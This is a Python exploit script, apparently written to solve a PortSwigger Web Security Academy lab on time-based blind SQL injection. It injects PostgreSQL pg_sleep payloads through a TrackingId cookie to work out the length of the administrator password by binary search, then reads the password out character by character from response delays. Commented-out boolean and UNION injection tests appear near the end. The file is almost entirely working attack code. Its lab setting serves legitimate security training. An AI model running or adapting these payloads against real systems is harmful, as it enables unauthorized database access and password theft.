#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   Version 
#   Author: WildfootW
#   GitHub: github.com/WildfootW
#   Copyleft (C) 2020 WildfootW All rights reversed.
#
# SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
# if any string return by this SQL request, we have welcome back page
#
# PostgreSQL
#
# Remeber modify Host. Do not use valid Cookies.
# Char binary search failed due to don't know SQL char order
# ('n' > "M" & 'n' < "N" can be True)
#

import requests
import re
import time
from enum import Enum

char_list_digits = "0123456789"
char_list_lowercase_letters = "abcdefghijklmnopqrstuvwxyz"
char_list_uppercase_letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
#char_list_symbols = """ !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~"""
char_list_symbols_arr = [
            """ !"#$%&()*+,-./""",  # remove '
            """:<=>?@""",           # remove ;
            """[\]^_`""",
            """{|}~""",
        ]
char_list_symbols = char_list_symbols_arr[0] + char_list_symbols_arr[1] + char_list_symbols_arr[2] + char_list_symbols_arr[3]
char_list_all = char_list_symbols_arr[0] + char_list_digits + char_list_symbols_arr[1] + char_list_uppercase_letters + char_list_symbols_arr[2] + char_list_lowercase_letters + char_list_symbols_arr[3]

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

headers = {
    'Host': 'acfe1f9d1f6e899180aecf13005f0002.web-security-academy.net',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'max-age=0',
}

cookies = {
    'TrackingId': 'XYZ', # use invalid id
    'session': 'wsuAhTce2oFXHJEPYrUTW8X5JARNSZy9'
}

class Compare(Enum):
    GREATER = 0
    LESS    = 1
    EQUAL   = 2

def blind_sqli(append):
    custom_cookies = cookies.copy()
    custom_cookies['TrackingId'] += append

    time_origin = time.clock_gettime(time.CLOCK_REALTIME)
    response = requests.get('https://' + headers['Host'] + '/', headers=headers, cookies=custom_cookies, verify=False, proxies=proxies)
    time_after = time.clock_gettime(time.CLOCK_REALTIME)
    if time_after - time_origin > 10:
        return True
    else:
        return False

def blind_sqli_password_length(compare, length):
    if compare == Compare.GREATER:
        return blind_sqli("'%3b SELECT CASE WHEN (username = 'administrator' AND length(password) > " + str(length) + ") THEN pg_sleep(10) ELSE NULL END FROM users-- ")
    elif compare == Compare.LESS:
        return blind_sqli("'%3b SELECT CASE WHEN (username = 'administrator' AND length(password) < " + str(length) + ") THEN pg_sleep(10) ELSE NULL END FROM users-- ")
    elif compare == Compare.EQUAL:
        return blind_sqli("'%3b SELECT CASE WHEN (username = 'administrator' AND length(password) = " + str(length) + ") THEN pg_sleep(10) ELSE NULL END FROM users-- ")

def blind_sqli_password_char(pos, test_char):
    return blind_sqli("'%3b SELECT CASE WHEN (username = 'administrator' AND substr(password, " + str(pos + 1) + ", 1) = '" + test_char + "') THEN pg_sleep(10) ELSE NULL END FROM users-- ")

def blind_sqli_password_char_re(pos, expression):
    return blind_sqli("'%3b SELECT CASE WHEN (username = 'administrator' AND substr(password, " + str(pos + 1) + ", 1) SIMILAR TO '" + expression + "') THEN pg_sleep(10) ELSE NULL END FROM users-- ")

def password_length_binary_search(left = 0, right = 100):
    print("Test Length: ", end = "")
    while left <= right:
        mid = int((left + right) / 2)
        print(mid, "", end = "", flush = True)
        if   blind_sqli_password_length(Compare.LESS, mid):
            right = mid - 1
        elif blind_sqli_password_length(Compare.GREATER, mid):
            left = mid + 1
        elif blind_sqli_password_length(Compare.EQUAL, mid):
            print("Check!")
            return mid
    return -1

#def password_dump_char_by_binary_search(pos, left = 0, right = len(test_chars) - 1):
#    while left <= right:
#        mid = int((left + right) / 2)
#        print(test_chars[mid], "", end = "", flush = True)
#        if   blind_sqli_password_char(Compare.LESS, pos, test_chars[mid]):
#            right = mid - 1
#        elif blind_sqli_password_char(Compare.GREATER, pos, test_chars[mid]):
#            left = mid + 1
#        elif blind_sqli_password_char(Compare.EQUAL, pos, test_chars[mid]):
#            return test_chars[mid]
#    return None

def password_dump_char_by_scan(pos, char_list):
    for j in range(len(char_list)):
        print(char_list[j], end = "", flush = True)
        if blind_sqli_password_char(pos, char_list[j]):
            return char_list[j]
    return None

def password_dump_char(pos):
    ret = None
#    ret = password_dump_char_by_scan(pos, char_list_digits)
#    if not ret:
#        ret = password_dump_char_by_scan(pos, char_list_lowercase_letters)
#        if not ret:
#            ret = password_dump_char_by_scan(pos, char_list_uppercase_letters)
#            if not ret:
#                ret = password_dump_char_by_scan(pos, char_list_symbols)
    print("RE", end = "", flush = True)
    if blind_sqli_password_char_re(pos, r"[0-9]"):
        ret = password_dump_char_by_scan(pos, char_list_digits)
    elif blind_sqli_password_char_re(pos, r"[a-z]"):
        ret = password_dump_char_by_scan(pos, char_list_lowercase_letters)
    elif blind_sqli_password_char_re(pos, r"[A-Z]"):
        ret = password_dump_char_by_scan(pos, char_list_uppercase_letters)
    else:
        ret = password_dump_char_by_scan(pos, char_list_symbols)

    if ret:
        print(" Check!")
        return ret
    else:
        print(" Error!")
        return None

def password_dump(length):
    ret = ""
    for i in range(length):
        print("Test Password", ret, ":", end = "")
        ret += password_dump_char(i)
    return ret

if __name__ == "__main__":
    #print(blind_sqli("' AND '1' = '1")) # TRUE
    #print(blind_sqli("' AND '1' = '2")) # FALSE
    #print(blind_sqli("' UNION SELECT 'a' WHERE 1 = 1 -- ")) # TRUE
    #print(blind_sqli("' UNION SELECT 'a' WHERE 1 = 2 -- ")) # FLASE
    #print(blind_sqli("' UNION SELECT 'a' FROM users WHERE username = 'administrator' AND length(password) > 19 -- ")) # TRUE
    #print(blind_sqli("' UNION SELECT 'a' FROM users WHERE username = 'administrator' AND length(password) > 20 -- ")) # FALSE

    #blind_sqli_password_char(0, 'b')
    password_length = password_length_binary_search()
    print(password_length)
    #print(password_dump_by_binary_search(password_length))
    print(password_dump(password_length))


